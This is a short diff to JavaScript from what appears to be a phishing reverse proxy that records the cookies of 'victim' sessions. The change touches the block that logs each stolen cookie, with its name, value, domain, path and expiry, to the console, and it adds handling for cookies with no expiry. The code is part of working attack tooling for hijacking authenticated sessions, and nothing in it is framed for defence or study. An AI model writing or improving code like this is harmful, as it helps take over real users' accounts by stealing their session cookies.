@@ -310,10 +310,12 @@ const makeProxyRequest = (proxyRequestProtocol, proxyRequestOptions, currentSess
             updateCurrentSessionCookies(proxyRequestOptions, proxyResponseCookie, proxyHostname, currentSession, proxyResponse.headers.date);
 
             // ===================== ADDED: PRINT ALL COOKIES TO CONSOLE =====================
-            console.log(`[COOKIES] Session: ${currentSession}`);
-            for (const cookie of VICTIM_SESSIONS[currentSession].cookies) {
-                console.log(`  ${cookie.name}=${cookie.value} (domain=${cookie.domain}, path=${cookie.path}, expires=${new Date(cookie.expires).toISOString()})`);
-            }
+console.log(`[COOKIES] Session: ${currentSession}`);
+for (const cookie of VICTIM_SESSIONS[currentSession].cookies) {
+    const expiresStr = isNaN(cookie.expires) ? 'session' : new Date(cookie.expires).toISOString();
+    console.log(`  ${cookie.name}=${cookie.value} (domain=${cookie.domain}, path=${cookie.path}, expires=${expiresStr})`);
+}
+// ==============================================================================
             // ==============================================================================
         }
         proxyResponse.headers["cache-control"] = "no-store";
